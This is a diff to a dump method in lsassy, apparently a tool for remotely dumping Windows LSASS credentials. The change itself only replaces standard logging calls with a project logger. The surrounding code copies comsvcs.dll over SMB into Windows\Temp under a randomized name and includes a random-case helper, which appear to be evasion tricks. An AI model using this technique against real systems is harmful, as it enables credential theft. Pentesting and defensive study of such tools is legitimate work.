@@ -1,9 +1,9 @@
-import logging
 import random
 import string
 
 from lsassy.dumpmethod import IDumpMethod, CustomBuffer
 from lsassy.impacketfile import ImpacketFile
+from lsassy.logger import lsassy_logger
 
 
 class DumpMethod(IDumpMethod):
@@ -20,7 +20,8 @@ class DumpMethod(IDumpMethod):
         self.comsvcs_copied = False
         self.comsvcs_copy_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".dll"
         self.comsvcs_copy_path = "\\Windows\\Temp\\"
-        logging.debug("Comsvcss.dll will be copied to {}{}".format(self.comsvcs_copy_path, self.comsvcs_copy_name))
+        
+        lsassy_logger.debug("Comsvcss.dll will be copied to {}{}".format(self.comsvcs_copy_path, self.comsvcs_copy_name))
 
     def random_case(self, s):
         return ''.join(c.upper() if random.getrandbits(1) == 1 else c.lower() for c in s)
@@ -51,11 +52,11 @@ class DumpMethod(IDumpMethod):
 
     def prepare(self, options):
         try:
-            logging.info("Opening comsvcs.dll")
+            lsassy_logger.info("Opening comsvcs.dll")
             buff = CustomBuffer()
             self._session.smb_session.getFile("C$", "\\Windows\\System32\\comsvcs.dll", buff.write)
             self._session.smb_session.putFile("C$", self.comsvcs_copy_path + self.comsvcs_copy_name, buff.read)
-            logging.success("Comsvcs.dll copied")
+            lsassy_logger.info("Comsvcs.dll copied")
             self.comsvcs_copied = True
             return True
         except Exception as e:
